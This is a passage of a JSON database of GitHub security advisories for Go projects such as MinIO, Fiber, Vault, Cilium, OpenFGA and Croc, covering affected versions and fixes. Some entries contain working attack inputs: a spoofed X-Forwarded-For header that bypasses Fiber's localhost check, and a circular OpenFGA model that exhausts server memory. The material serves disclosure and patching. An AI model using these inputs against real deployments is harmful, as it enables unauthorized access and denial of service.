"CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/schollz/croc/v9"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "9.6.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43620"}, {"type": "WEB", "url": "https://github.com/schollz/croc/issues/595"}, {"type": "PACKAGE", "url": "https://github.com/schollz/croc"}, {"type": "WEB", "url": "https://www.openwall.com/lists/oss-security/2023/09/08/2"}, {"type": "WEB", "url": "http://www.openwall.com/lists/oss-security/2023/09/21/5"}], "database_specific": {"cwe_ids": ["CWE-116"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-21T16:59:43Z", "nvd_published_at": "2023-09-20T06:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h24c-6p6p-m3vx", "modified": "2023-09-01T20:51:05Z", "published": "2023-09-01T20:51:05Z", "aliases": [], "summary": "tss-lib leaks secret keys in response to incorrectly constructed Paillier moduli", "details": "### Impact\n\nThe specification of the GG18 threshold ECDSA signature protocol contains a vulnerability allowing an attacker to recover the shared secret key. If a participant generates a Paillier modulus `N` containing small factors (less than `2^100`) they can interact with other participants in the signing protocol to steal their secret key shares in as little as sixteen signing attempts. The master key can then be reconstructed from these shares.\n\n### Patches\n\nThe implementation of GG18 in tss-lib did not prove that `N` is biprime or that it doesn't contain small factors. The fixed implementation adds the following proofs from the CGGMP21 threshold ECDSA protocol to the key generation:\n\n- Paillier-Blum Modulus (`N` is the product of two primes)\n- No Small Factor (both factors of `N` are greater than `2^256`)\n\nThese proofs apply to both the Paillier encryption modulus `N`, and the modulus `NTilde` used in MTA proofs.\n\nTo address the issue in the resharing protocol, an additional round has been added to the end so that participants can confirm that they received valid proofs.\n\n### References\n\n- [GG18](https://eprint.iacr.org/2019/114)\n- [CGGMP21](https://eprint.iacr.org/2021/060)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/bnb-chain/tss-lib"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.3.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/threshold-network/tss-lib/security/advisories/GHSA-h24c-6p6p-m3vx"}, {"type": "WEB", "url": "https://github.com/threshold-network/tss-lib/commit/2e712689cfbeefede15f95a0ec7112227d86f702"}, {"type": "WEB", "url": "https://eprint.iacr.org/2019/114"}, {"type": "WEB", "url": "https://eprint.iacr.org/2021/060"}, {"type": "PACKAGE", "url": "https://github.com/threshold-network/tss-lib"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-09-01T20:51:05Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-2pxw-r47w-4p8c", "modified": "2023-09-05T15:45:10Z", "published": "2023-09-05T15:45:10Z", "aliases": ["CVE-2023-28434"], "summary": "Privilege Escalation on Linux/MacOS", "details": "### Impact\nAn attacker can use crafted requests to bypass metadata bucket name checking and put an object into any bucket while processing `PostPolicyBucket`. To carry out this attack, the attacker requires credentials with `arn:aws:s3:::*` permission, as well as enabled Console API access.\n\n### Patches\n```\ncommit 67f4ba154a27a1b06e48bfabda38355a010dfca5\nAuthor: Aditya Manthramurthy <donatello@users.noreply.github.com>\nDate:   Sun Mar 19 21:15:20 2023 -0700\n\n    fix: post policy request security bypass (#16849)\n```\n\n### Workarounds\nBrowser API access must be enabled turning off `MINIO_BROWSER=off` allows for this workaround.\n\n### References\nThe vulnerable code:\n```go\n// minio/cmd/generic-handlers.go\nfunc setRequestValidityHandler(h http.Handler) http.Handler {\n  return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n    // ...\n    // For all other requests reject access to reserved buckets\n    bucketName, _ := request2BucketObjectName(r)\n    if isMinioReservedBucket(bucketName) || isMinioMetaBucket(bucketName) {\n      if !guessIsRPCReq(r) && !guessIsBrowserReq(r) && !guessIsHealthCheckReq(r) && !guessIsMetricsReq(r) && !isAdminReq(r) && !isKMSReq(r) {\n        if ok {\n          tc.FuncName = \"handler.ValidRequest\"\n          tc.ResponseRecorder.LogErrBody = true\n        }\n        writeErrorResponse(r.Context(), w, errorCodes.ToAPIErr(ErrAllAccessDisabled), r.URL)\n        return\n      }\n    }\n    // ...\n```", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/minio/minio"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-202303200415"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/minio/minio/security/advisories/GHSA-2pxw-r47w-4p8c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28434"}, {"type": "WEB", "url": "https://github.com/minio/minio/pull/16849"}, {"type": "WEB", "url": "https://github.com/minio/minio/commit/67f4ba154a27a1b06e48bfabda38355a010dfca5"}, {"type": "PACKAGE", "url": "https://github.com/minio/minio"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-09-05T15:45:10Z", "nvd_published_at": "2023-03-22T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3q5p-3558-364f", "modified": "2023-09-11T14:39:57Z", "published": "2023-09-08T13:27:21Z", "aliases": ["CVE-2023-41338"], "summary": "Fiber unauthorized access vulnerability in `ctx.IsFromLocal()`", "details": "### Impact\nThis vulnerability can be categorized as a security misconfiguration. It impacts users of our project who rely on the [ctx.IsFromLocal()](https://docs.gofiber.io/api/ctx#isfromlocal) method to restrict access to localhost requests. If exploited, it could allow unauthorized access to resources intended only for localhost.\n\nIn it's implementation it uses c.IPs():\n\n```go\n// IPs returns a string slice of IP addresses specified in the X-Forwarded-For request header.\n// When IP validation is enabled, only valid IPs are returned.\nfunc (c *Ctx) IPs() []string {\n    return c.extractIPsFromHeader(HeaderXForwardedFor)\n}\n```\n\nThereby, setting `X-Forwarded-For: 127.0.0.1` in a request from a foreign host, will result in true for [ctx.IsFromLocal()](https://docs.gofiber.io/api/ctx#isfromlocal) \n\n### Patches\nThis issue has been patched in `v2.49.2` with commit [b8c9ede6efa231116c4bd8bb9d5e03eac1cb76dc](https://github.com/gofiber/fiber/commit/b8c9ede6efa231116c4bd8bb9d5e03eac1cb76dc)\n\n### Workarounds\nCurrently, there are no known workarounds to remediate this vulnerability without upgrading to the patched version. We strongly advise users to apply the patch as soon as it is released.\n\n### References\nFor further information and context regarding this security issue, please refer to the following resources:\n\n- [Mozilla Developer Network - X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gofiber/fiber"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.14.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/gofiber/fiber/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.49.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gofiber/fiber/security/advisories/GHSA-3q5p-3558-364f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-41338"}, {"type": "WEB", "url": "https://github.com/gofiber/fiber/commit/b8c9ede6efa231116c4bd8bb9d5e03eac1cb76dc"}, {"type": "WEB", "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For"}, {"type": "WEB", "url": "https://docs.gofiber.io/api/ctx#isfromlocal"}, {"type": "PACKAGE", "url": "https://github.com/gofiber/fiber"}], "database_specific": {"cwe_ids": ["CWE-670"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-08T13:27:21Z", "nvd_published_at": "2023-09-08T19:15:43Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v84f-6r39-cpfc", "modified": "2023-09-15T19:03:05Z", "published": "2023-09-15T00:30:29Z", "aliases": ["CVE-2023-4680"], "summary": "HashiCorp Vault Improper Input Validation vulnerability", "details": "HashiCorp Vault and Vault Enterprise transit secrets engine allowed authorized users to specify arbitrary nonces, even with convergent encryption disabled. The encrypt endpoint, in combination with an offline attack, could be used to decrypt arbitrary ciphertext and potentially derive the authentication subkey when using transit secrets engine without convergent encryption. Introduced in 1.6.0 and fixed in 1.14.3, 1.13.7, and 1.12.11.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.6.0"}, {"fixed": "1.12.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4680"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-28-vault-s-transit-secrets-engine-allowed-nonce-specified-without-convergent-encryption/58249"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-15T19:03:05Z", "nvd_published_at": "2023-09-15T00:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9hwp-cj7m-wjw4", "modified": "2023-09-29T22:05:52Z", "published": "2023-09-29T12:30:16Z", "aliases": ["CVE-2023-5195"], "summary": "Mattermost Incorrect Authorization vulnerability", "details": "Mattermost fails to properly validate the permissions when soft deleting a team allowing a team member to soft delete other teams that they are not part of\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.1.0"}, {"fixed": "8.1.1"}]}], "versions": ["8.1.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.10"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5195"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-29T22:05:52Z", "nvd_published_at": "2023-09-29T10:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-23px-mw2p-46qm", "modified": "2023-09-06T20:49:54Z", "published": "2023-09-06T20:49:54Z", "aliases": [], "summary": "Cosmos-SDK Cosmovisor component may be vulnerable to denial of service", "details": "**Component**: Cosmovisor\n**Criticality**: Medium\n**Affected Versions**: Cosmovisor < v1.0.0 (distributed with Cosmos-SDK < 0.46)\n**Affected Users**: Validators and Node operators utilizing unsupported versions of Cosmovisor\n**Impact**: DOS, potential RCE on node depending on configuration\n\n\nAn issue has been identified on unsupported versions of Cosmovisor which may result in a Denial of Service or Remote Code Execution path depending on configuration for a node or validator using the vulnerable version to manage their node. \n\nIf a validator is utilizing an affected version of Cosmovisor with `DAEMON_ALLOW_DOWNLOAD_BINARIES` set to true, a non-default configuration, it may be possible for an attacker to trigger a Remote Code Execution path as well on the host. In this configuration it is recommended to immediately stop use of the `DAEMON_ALLOW_DOWNLOAD_BINARIES` feature, and then proceed with an upgrade of Cosmovisor.\n\nIt is recommended that all validators utilizing unsupported versions of Cosmovisor to upgrade to the latest supported versions immediately.  If you are utilizing a forked version of Cosmos-SDK, it is recommended to stop use of Cosmovisor until it is possible to update to a supported version of Cosmovisor, whether through your project\u2019s fork, or directly compiled from the Cosmos-SDK. At the time of this advisory, the latest version of Cosmovisor is v1.5.0. \n\nAdditionally, the Amulet team recommends that developers building chains powered by Cosmos-SDK share this advisory with validators and node operators to ensure this information is available to all impacted parties within their ecosystems.\n\nFor more information about Cosmovisor, see https://docs.cosmos.network/main/tooling/cosmovisor\n\nThis issue was discovered by [Maxwell Dulin](https://maxwelldulin.com) and Nathan Kirkland, who reported it to the Cosmos Bug Bounty Program.  If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see [https://hackerone.com/cosmos](https://hackerone.com/cosmos).\n\n## How to tell if I am affected?\n\nRunning the following command will output whether your cosmovisor version is vulnerable to this issue or not.  \n\nVulnerable to this issue: \n\n```\nstrings ./cosmovisor | grep -q \"NEEDED at\" && echo \"vulnerable\" || echo \"NOT vulnerable\"\n\nvulnerable\n```\n\n\nNOT vulnerable to this issue:\n\n```\nstrings ./cosmovisor_new | grep -q \"NEEDED at\" && echo \"vulnerable\" || echo \"NOT vulnerable\"\n\nNOT vulnerable\n```\n\n\n*****\n\nA Note from Amulet on the Security Advisory Process\n\nIn the interest of timely resolution of this issue for validators and node operators, the Amulet team has chosen to use existing processes and resources for distributing security advisories within the Cosmos and Interchain Ecosystems. Stay tuned as we implement an improved, more robust security advisory distribution system that will provide equitable access to information about security issues in the Interchain Stack.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cosmos/cosmos-sdk"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.46"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-23px-mw2p-46qm"}, {"type": "PACKAGE", "url": "https://github.com/cosmos/cosmos-sdk"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/blob/tools/cosmovisor/v1.5.0/tools/cosmovisor/CHANGELOG.md"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/releases/tag/v0.46.0"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-06T20:49:54Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-6jqw-jwf5-rp8h", "modified": "2023-09-27T20:14:44Z", "published": "2023-09-27T20:14:44Z", "aliases": ["CVE-2023-40026"], "summary": "Path traversal allows leaking out-of-bound Helm charts from Argo CD repo-server", "details": "### Impact\nIn Argo CD versions prior to 2.3 (starting at least in v0.1.0, but likely in any version using Helm before 2.3), using a specifically-crafted Helm file could reference external Helm charts handled by the same repo-server to leak values, or files from the referenced Helm Chart. This was possible because Helm paths were predictable. \n\nThe vulnerability worked by adding a Helm chart that referenced Helm resources from predictable paths. Because the paths of Helm charts were predictable and available on an instance of repo-server, it was possible to reference and then render the values and resources from other existing Helm charts regardless of permissions. While generally, secrets are not stored in these files, it was nevertheless possible to reference any values from these charts. \n\n### Patches\nThis issue was fixed in Argo CD 2.3 and subsequent versions by randomizing Helm paths.\n\n### Workarounds\nUser's still using Argo CD 2.3 or below are advised to update to a [supported version](https://argo-cd.readthedocs.io/en/stable/operator-manual/installation/#supported-versions). If this is not possible, disabling Helm chart rendering, or using an additional repo-server for each Helm chart would prevent possible exploitation.  \n\n### References\nhttps://github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [example link to repo](http://example.com)\n* Email us at [example email address](mailto:example@example.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.8.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.3.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-6jqw-jwf5-rp8h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40026"}, {"type": "WEB", "url": "https://argo-cd.readthedocs.io/en/stable/operator-manual/installation/#supported-versions"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-23"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-27T20:14:44Z", "nvd_published_at": "2023-09-27T21:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h626-pv66-hhm7", "modified": "2023-09-08T19:43:48Z", "published": "2023-09-08T18:30:29Z", "aliases": ["CVE-2023-4782"], "summary": "Terraform allows arbitrary file write during the `init` operation", "details": "Terraform version 1.0.8 through 1.5.6 allows arbitrary file write during the `init` operation if run on maliciously crafted Terraform configuration. This vulnerability is fixed in Terraform 1.5.7.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:R/S:C/C:L/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/terraform"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.8"}, {"fixed": "1.5.7"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4782"}, {"type": "WEB", "url": "https://github.com/hashicorp/terraform/pull/33745"}, {"type": "WEB", "url": "https://github.com/hashicorp/terraform/commit/0f2314fb62193c4be94328cc026fcb7ec1e9b893"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-27-terraform-allows-arbitrary-file-write-during-init-operation/58082"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/terraform"}, {"type": "WEB", "url": "https://github.com/hashicorp/terraform/releases/tag/v1.5.7"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-08T19:43:48Z", "nvd_published_at": "2023-09-08T18:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gj2r-phwg-6rww", "modified": "2023-09-27T15:42:11Z", "published": "2023-09-26T18:00:22Z", "aliases": ["CVE-2023-39347"], "summary": "Kubernetes users may update Pod labels to bypass network policy", "details": "### Impact\n\nAn attacker with the ability to update pod labels can cause Cilium to apply incorrect network policies.\n\nThis issue arises due to the fact that on pod update, Cilium incorrectly uses user-provided pod labels to select the policies which apply to the workload in question.\n\nThis can affect:\n\n* Cilium network policies that use the namespace, service account or cluster constructs to restrict traffic\n* Cilium clusterwide network policies that use Cilium namespace labels to select the Pod\n* Kubernetes network policies\n\nNon-existent construct names can be provided, which bypass all network policies applicable to the construct. For example, providing a pod with a non-existent namespace as the value of the `io.kubernetes.pod.namespace` label results in none of the namespaced CiliumNetworkPolicies applying to the pod in question.\n\nThis attack requires the attacker to have [Kubernetes API Server access](https://docs.cilium.io/en/latest/security/threat-model/#kubernetes-api-server-attacker), as described in the Cilium Threat Model.\n\n### Patches\n\nThis issue affects:\n\n- Cilium <= v1.14.1\n- Cilium <= v1.13.6\n- Cilium <= v1.12.13\n\nThis issue has been resolved in:\n\n- Cilium v1.14.2\n- Cilium v1.13.7\n- Cilium v1.12.14\n\n### Workarounds\n\nAn admission webhook can be used to prevent pod label updates to the `k8s:io.kubernetes.pod.namespace` and `io.cilium.k8s.policy.*` keys.\n\n### Acknowledgements\nThe Cilium community has worked together with members of Palantir and Isovalent to prepare these mitigations. Special thanks to @odinuge for reporting this issue and to @nebril for the fix.\n\n### For more information\nIf you have any questions or comments about this advisory, please reach out on [Slack](https://docs.cilium.io/en/latest/community/community/#slack).\n\nIf you think you have found a vulnerability in Cilium, we strongly encourage you to report it to our private security mailing list \u2013 [security@cilium.io](mailto:security@cilium.io) \u2013 first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.13.0"}, {"fixed": "1.13.7"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.13.6"}}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.14.1"}}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.12.14"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.12.13"}}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-gj2r-phwg-6rww"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39347"}, {"type": "WEB", "url": "https://docs.cilium.io/en/latest/security/threat-model/#kubernetes-api-server-attacker"}, {"type": "PACKAGE", "url": "https://github.com/cilium/cilium"}], "database_specific": {"cwe_ids": ["CWE-345"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-26T18:00:22Z", "nvd_published_at": "2023-09-27T15:18:55Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2hm9-h873-pgqh", "modified": "2023-09-28T21:27:04Z", "published": "2023-09-28T21:27:04Z", "aliases": ["CVE-2023-43645"], "summary": "OpenFGA Vulnerable to DoS from circular relationship definitions", "details": "## Overview\nOpenFGA is vulnerable to a DoS attack when certain Check calls are executed against authorization models that contain circular relationship definitions. When the call is made, it's possible for the server to exhaust resources and die.\n\n## Am I Affected?\nYes, if your store contains an authorization model that allows circular relationships. For example, with this model:\n\n```\nmodel\n  schema 1.1\n\ntype user\n\ntype group\n  relations\n    define memberA: [user] or memberB or memberC or memberD or memberE\n    define memberB: [user] or memberA or memberC or memberD or memberE\n    define memberC: [user] or memberA or memberB or memberD or memberE\n    define memberD: [user] or memberA or memberB or memberC or memberE\n    define memberE: [user] or memberA or memberB or memberC or memberD\n```\n\nThis Check: `(user:anne, memberA, group:X)` can exhaust memory in the server.\n\n## Fix\nUpgrade to v1.3.2 and update any offending models.\n\n  **[BREAKING]** If your model contained cycles or a relation definition that has the relation itself in its evaluation path, then Checks and queries that require evaluation will no longer be evaluated on v1.3.2+ and will return errors instead. You will need to update your models to remove the cycles.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openfga/openfga"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/openfga/openfga/security/advisories/GHSA-2hm9-h873-pgqh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-43645"}, {"type": "WEB", "url": "https://github.com/openfga/openfga/commit/725296025fd81227c89525808652c6acd4a605f6"}, {"type": "PACKAGE", "url": "https://github.com/openfga/openfga"}], "database_specific": {"cwe_ids": ["CWE-835"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-28T21:27:04Z", "nvd_published_at": "2023-09-27T15:19:34Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h8wh-f7gw-fwpr", "modified": "2023-10-03T21:25:26Z", "published": "2023-09-29T12:30:16Z", "aliases": ["CVE-2023-5193"], "summary": "Mattermost Incorrect Authorization vulnerability", "details": "Mattermost fails to properly check permissions when retrieving a post allowing for\u00a0a System Role with the permission to manage channels to read the posts of a DM conversation.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.1.0"}, {"fixed": "8.1.1"}]}], "versions": ["8.1.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.10"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5193"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-09-29T20:37:29Z", "nvd_published_at": "2023-09-29T10:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9xfq-8j3r-xp5g", "modified": "2023-10-02T21:34:35Z", "published": "2023-09-28T06:30:20Z", "aliases": ["CVE-2023-44273"], "summary": "Consensys gnark-crypto allows Signature Malleability", "details": "Consensys gnark-crypto through 0.11.2 allows Signature Malleability. This occurs because deserialisation of EdDSA and ECDSA signatures does not ensure that the data is in a certain interval.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/Consensys/gnark-crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/consensys/gnark-crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-44273"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark-crypto/pull/449"}, {"type": "PACKAGE", "url": "https://github.com/Consensys/gnark-crypto"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark-crypto/releases"}, {"type": "WEB", "url": "https://github.com/Consensys/gnark-crypto/releases/tag/v0.12.0"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-9xfq-8j3r-xp5g"}, {"type": "WEB", "url": "https://verichains.io"}], "database_specific": {"cwe_ids": ["CWE-502"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-09-28T16:42:58Z", "nvd_published_at": "2023-09-28T04:15:12Z"}}, {"schema_version": "1.4.0", "id": "GHSA-33r7-wjfc-7w98", "modified": "2023-09-29T22:05:57Z", "published": "2023-09-29T12:30:16Z", "aliases": ["CVE-2023-5196"], "summary": "Mattermost Uncontrolled Resource Consumption vulnerability", "details": "Mattermost fails to enforce character limits in all possible notification props allowing an attacker to\u00a0send a really long value for a notification_prop resulting in the server consuming an abnormal quantity of computing resources and possibly becoming temporarily unavailable for its users. \n\n\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.1.0"}, {"fixed": "8.1.1"}]}], "versions": ["8.1.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "8.0.0"}, {"fixed": "8.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.10"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-5196"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-09-29T22:05:57Z", "nvd_published_at": "2023-09-29T10:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ppjh-xp5v-46wc", "modified": "2023-09-22T19:40:39Z", "published": "2023-09-20T06:30:50Z", "aliases": ["CVE-2023-43619"], "summary": "Croc sender may send dangerous new files to receiver", "details": "An issue was discovered in Croc through 9.6.5. A sender may send dangerous new files to a receiver, such as executable content or a `.ssh/authorized_keys` file. ", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": 